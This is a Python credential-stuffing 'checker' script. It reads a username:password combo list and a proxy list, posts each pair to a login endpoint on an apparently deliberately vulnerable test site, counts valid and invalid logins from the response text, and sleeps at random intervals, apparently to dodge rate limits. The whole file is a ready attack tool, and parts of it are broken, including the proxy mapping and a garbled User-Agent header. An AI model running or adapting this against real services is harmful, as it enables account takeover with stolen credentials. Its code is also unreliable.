import requests
from colorama import Fore
import os
import time
from easygui import fileopenbox
from datetime import datetime
import ctypes
import random

bad = 0
good = 0




e = fileopenbox(default = '*.txt', title = "Select Combo File")
r = open(e, "r", errors="ignore").read().split("\n")
combolist = [x.strip() for x in r if x != '']

e = fileopenbox(default = '*.txt', title = "Select Proxy File")
r = open(e, "r", errors="ignore").read().split("\n")
proxies = [x.strip() for x in r if x != '']

pr = dict(zip("https://", proxies))

os.system('cls')

api = 'http://testphp.vulnweb.com/userinfo.php'

now = datetime.now()
dt_string = now.strftime("%H:%M:%S")

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(':')

    username = acc [0]
    password = acc [1]
    account = username + ':' + password
    


    headers = {
        "Content-Type": "application/json",
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 Pragma: no-cacheAccept: */*",
        "uname": username,
        "pass": password
    }

    req = requests.post(api,data=headers,proxies=pr).text
    ctypes.windll.kernel32.SetConsoleTitleW(f"Test Checker Good:- {good} | Bad:- {bad}")

    logo = f'''{Fore.CYAN}
      ::::::::::: :::::::::: :::::::: ::::::::::: 
         :+:     :+:       :+:    :+:    :+:      
        +:+     +:+       +:+           +:+       
       +#+     +#++:++#  +#++:++#++    +#+        
      +#+     +#+              +#+    +#+         
     #+#     #+#       #+#    #+#    #+#          
    ###     ########## ########     ###                    
    '''
    print(logo)

    print(f'    {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] - GOOD:- {good}\n', end ='')
    
    print(f'    {Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] - BAD:- {bad}', end ='')

    
    
    if "On this page you can visualize" in req:
        good += 1
        print(end='\r')
        time.sleep(random.randint(3,6))
        os.system('cls')
        
        
    if "username" in req:
        bad += 1
        print(end='\r')
        time.sleep(random.randint(3,6))
        os.system('cls')
        
        